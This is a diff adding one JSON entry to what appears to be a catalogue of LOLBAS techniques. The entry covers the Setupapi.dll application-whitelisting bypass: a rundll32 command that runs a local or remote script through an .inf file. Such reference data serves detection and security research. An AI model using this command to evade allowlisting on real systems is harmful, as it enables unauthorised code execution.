@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-setupapi-dll-awl-bypass",
+  "name": "LOLBAS · Setupapi.dll (AWL Bypass)",
+  "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+  "description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "setupapi.dll",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Setupapi.dll/",
+  "upstream_id": "Setupapi.dll/AWL Bypass/0",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Setupapi.dll",
+      "url": "https://lolbas-project.github.io/lolbas/Setupapi.dll/"
+    }
+  ]
+}
